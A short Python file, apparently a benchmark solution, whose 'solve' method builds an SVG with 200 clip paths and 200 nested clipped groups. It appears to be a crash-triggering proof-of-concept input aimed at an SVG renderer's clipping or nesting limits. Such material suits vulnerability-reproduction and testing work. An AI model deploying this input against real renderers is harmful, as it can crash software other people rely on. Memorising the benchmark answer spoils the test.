class Solution:
    def solve(self, src_path: str) -> bytes:
        N = 200
        clip_defs = []
        for i in range(1, N + 1):
            clip_id = f"c{i}"
            clip_defs.append(f'<clipPath id="{clip_id}"><rect x="0" y="0" width="100" height="100"/></clipPath>')
        defs = ''.join(clip_defs)
        opens = []
        for i in range(1, N + 1):
            clip_id = f"c{i}"
            open_g = f'<g clip-path="url(#{clip_id})">'
            opens.append(open_g)
        content = '<rect x="10" y="10" width="10" height="10" fill="red"/>'
        closes = '</g>' * N
        nested = ''.join(opens) + content + closes
        svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
<defs>
{defs}
</defs>
{nested}
</svg>'''
        return svg.encode('utf-8')